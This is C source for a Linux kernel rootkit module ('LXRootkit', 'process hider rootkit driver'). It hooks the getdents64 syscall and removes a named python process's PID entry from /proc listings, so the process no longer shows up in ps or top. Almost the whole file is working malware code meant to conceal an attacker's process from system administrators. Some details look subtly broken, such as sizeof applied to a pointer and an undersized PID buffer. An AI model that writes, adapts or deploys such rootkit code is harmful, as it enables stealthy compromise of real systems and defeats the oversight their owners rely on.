
#include "hfiles/pch.h" /* precompiled header */ 

#include "hfiles/utils64.h"
#include "hfiles/inlHook.h"
#include "hfiles/typedefs.h"
#include "hfiles/sysHook.h"

/* allow us to find our PID automatically */ 
unsigned char ch_pid[4];  
static void getProcessID(const char* name)
{
    struct task_struct* task_list;
    unsigned int processID = 0;
    
    for_each_process(task_list) 
    {
        if((strncmp(task_list->comm, name, sizeof(name)) == 0)) 
        {
            // processID = task_list->pid;
            processID = task_list->pid; 
            sprintf(ch_pid, "%d", processID); 
        } 
    }
}

int my_sys_getdents64(struct pt_regs *regs)
{
   /* restore the function pointer to return to original handler */ 
    org_sys_getdents64 = hi.originalFunc; 
    int ret = org_sys_getdents64(regs); 

    if(ret <= 0) 
        return ret; 

    int offset = 0; 
    char* cur = (char*)regs->si; 
    struct linux_dirent64 *next = (struct linux_dirent64*)regs->si; 

    while(offset < ret)  
    {
        next = (struct linux_dirent64*)(cur + offset); 

        /*
         * it looks like getdents is used across all listing functions, which is pretty handy for us. In the case of ps/top commands
         * it does take all the /proc/ files, and opens them one by one(pid order) and reads the cmdline contents. So we can mask off our target pid, and replace with another entry.  
         */ 
         if(strcmp(next->d_name, ch_pid) == 0)
        {            
            // here we take the next entry & copy it to our current entry which we've found,
            memcpy(cur + offset, cur + offset + next->d_reclen, ret - (offset  + next->d_reclen)); 
            // redfine the return value little bit , so it returns with a differnt state. 
            ret -= next->d_reclen; 
        } 
        /* calc the next entry */ 
        offset += next->d_reclen;
    }
    return ret; 
}

static int __init rootkit_init(void) 
{   
    printk(KERN_INFO "[*] LXRootkit loaded..."); 
    printk(KERN_INFO "[*] LXRootkit hidding process..."); 

    getProcessID("python"); // finds our python server pid and then converts it to string so we can use it in our hook handler  
    hook_syscall_x64(my_sys_getdents64, __NR_getdents64);

    return 0; 
}

static void __exit rootkit_exit(void) 
{
    unhook_syscall_x64(); 
}
MODULE_LICENSE("GPL");
MODULE_AUTHOR("dan0xcc");
MODULE_DESCRIPTION("process hider rootkit driver"); 
MODULE_VERSION("1.00");


module_init(rootkit_init); // invokes loading 
module_exit(rootkit_exit); // invokes unloading 

